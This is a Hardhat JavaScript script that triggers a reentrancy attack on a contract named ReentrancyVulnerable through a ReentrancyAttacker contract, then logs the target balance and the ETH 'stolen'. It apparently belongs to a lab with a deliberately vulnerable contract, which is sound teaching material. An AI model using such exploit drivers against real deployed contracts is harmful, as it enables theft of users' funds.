const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Reentrancy Attack initiated by:", attacker.address);

    const deployments = require("../deployments.json");
    const vuln = await hre.ethers.getContractAt("ReentrancyVulnerable", deployments.ReentrancyVulnerable);
    const reentAttacker = await hre.ethers.getContractAt("ReentrancyAttacker", deployments.ReentrancyAttacker);

    const before = await hre.ethers.provider.getBalance(deployments.ReentrancyVulnerable);
    console.log("[i] Target balance:", hre.ethers.utils.formatEther(before), "ETH");

    const tx = await reentAttacker.attack({value: hre.ethers.utils.parseEther("1")});
    await tx.wait();

    const after = await hre.ethers.provider.getBalance(deployments.ReentrancyVulnerable);
    const stolen = await reentAttacker.getContractBalance();

    console.log("[✓] Attack complete!");
    console.log("    Target remaining:", hre.ethers.utils.formatEther(after), "ETH");
    console.log("    Stolen:", hre.ethers.utils.formatEther(stolen), "ETH");
    console.log("    Attack count:", (await reentAttacker.attackCount()).toString());
}

main().catch(console.error);
